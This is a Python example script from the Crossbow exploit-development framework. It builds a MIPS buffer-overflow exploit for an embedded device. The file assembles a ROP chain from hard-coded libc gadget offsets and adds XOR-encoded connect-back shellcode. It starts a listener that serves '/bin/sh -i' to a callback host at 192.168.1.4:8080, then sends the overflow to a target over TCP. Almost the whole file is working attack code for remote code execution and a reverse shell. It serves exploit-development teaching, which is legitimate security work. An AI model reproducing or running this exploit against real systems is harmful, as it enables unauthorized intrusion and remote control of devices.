#!/usr/bin/env python
# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 


#This is an exmaple using Crossbow's OverflowBuffer and SectionCreator classes
#to build a buffer overflow

import os
import struct
import sys
import socket
import signal
import time
from crossbow.overflow_development.overflowbuilder import OverflowBuffer,SectionCreator
from crossbow.common.support import LittleEndian,Logging
from crossbow.servers import ConnectbackHost
from crossbow.servers.callback_server import ConnectbackServer
from crossbow.payloads.mips.callback_payload import CallbackPayload
from crossbow.encoders.mips import MipsXorEncoder
#from crossbow.encoders.mips import MipsUpperAlphaEncoder
logger=Logging()

CALLBACK_IP="192.168.1.4"
CALLBACK_PORT="8080"

qemu=False

libc_qemu_base=0x4084a000
libc_actual_base=0x2aaee000
libc_base=0

if qemu:
    libc_base=libc_qemu_base
else:
    libc_base=libc_actual_base
#badchars=['\0',0x0d,'\n',0x20]
badchars=[]
SC=SectionCreator(LittleEndian,base_address=libc_base,badchars=badchars)

sections=[]

#function_epilogue_rop
section=SC.gadget_section(528,0x31b44,
            description="[$ra] function epilogue that sets up $s1-$s7")
sections.append(section)

#Sleep arg 2 into $a0, stack data into $ra, then jalr $s0
section=SC.gadget_section(656,0x43880,
            description="[$a0] Set up 2 sec arg to sleep(), then jalr $s1")
sections.append(section)

#address of sleep
section=SC.gadget_section(620,0x506c0,
            description="Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")
sections.append(section)

#placeholder address that can be dereferenced without crashing, this goes in $s2
section=SC.gadget_section(628,0x427a4,
            description="[$s2] placeholder, derefed without crashing.")
sections.append(section)

#stackfinder. add 0xe0+var_c0 + $sp into $s0, jalr $s6
section=SC.gadget_section(688,0x427a4,description="stackfinder.")
sections.append(section)

#stackjumber. jalr $s0
section=SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
sections.append(section)

#you can instantiate a ConnectbackHost instead ad pass it to both
connectback_host=ConnectbackHost(CALLBACK_IP) #default port is 8080
connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")

#Or non-interactive exploitation:
#connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)

payload=CallbackPayload(connectback_host,LittleEndian)

encoded_payload=MipsXorEncoder(payload,LittleEndian,badchars=badchars)
#encoded_payload=MipsUpperAlphaEncoder(payload,LittleEndian,badchars=badchars)
section=SC.string_section(700,encoded_payload.shellcode,
            description="encoded connect back payload")
sections.append(section)
logger.LOG_DEBUG("length of encoded shellcode, including stub is: %d" % len(encoded_payload.shellcode))
print encoded_payload.pretty_string()


buf=OverflowBuffer(LittleEndian,1300,sections)
logger.LOG_DEBUG("Length of overflow: %d" % buf.len())
if len(sys.argv) == 2:
    search_value=sys.argv[1]
    if search_value.startswith("0x"):
        value=int(search_value,16)
    offset=buf.find_offset(value)
    if(offset < 0):
        print "Couldn't find value %s in the overflow buffer." % search_value
    else:
        print "Found value %s at\noffset: %d" % (search_value,offset)
    exit(0)


pid=None
pid=connectback_server.serve_connectback()
time.sleep(1)
if pid and pid > 0:
    try:
        addr=sys.argv[1]
        port=int(sys.argv[2])

        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        sock.connect((addr,port))
        print("sending exploit.")
        sock.send(str(buf))
        sock.close()
        connectback_server.wait()
    except:

        print("Failed to connect. Killing connect-back server.")
        os.kill(pid,signal.SIGTERM)



